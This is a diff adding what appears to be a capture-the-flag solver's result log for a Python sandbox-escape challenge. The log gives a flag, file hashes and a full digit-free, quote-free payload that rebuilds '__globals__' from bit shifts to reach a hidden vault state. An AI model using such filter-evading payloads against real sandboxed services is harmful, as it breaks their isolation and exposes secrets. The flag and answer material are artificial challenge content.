@@ -1,0 +1,12 @@
+Sandbox bypass: PASS (315 characters)
+Ciphertext extracted: [29406, 62193, 3550, 51604, 54474, 58556, 5807, 62536, 3004, 10962, 33499, 52037, 51010, 45605, 6009, 18571, 21884, 35367, 29761, 57118, 51549]
+Encryption round-trip: PASS
+Flag: NFXCTF{pyj41l_4st_4lch3my_vm_pwn_d84f216a}
+=== hashes ===
+46c34f32dd4e0ad5c83176c204e19698c580a60c97c324147bf1e0db8af058bc  chall.py
+8a36f6b0cefab97fb7af259cf07efd31bb4ca9d407214c407a41ef9dcc0db2a3  solve_alchemist.py
+=== payload length / forbidden chars ===
+payload length: 315
+contains digits/quotes: False
+parses as expression: yes
+payload: ((a:=True),(b:=a<<a),(d:=b<<a),(e:=d<<a),(f:=e<<a),(h:=f<<a),(j:=h<<a),(k:=j+h),(u:=chr(k-a)),getattr(als,u+u+chr(k+a+b+d)+chr(k+d+e)+chr(k+a+b+d+e)+chr(k+b)+chr(k+a)+chr(k+d+e)+chr(k+a+b+f)+u+u)[u+chr(k-e-b)+chr(j+a)+chr(k-e-b-a)+chr(j+e+d)+chr(k-e-d)+u+chr(k-e-d-a)+chr(k-e-d)+chr(j+a)+chr(k-e-d)+chr(j+d+a)])[-a]
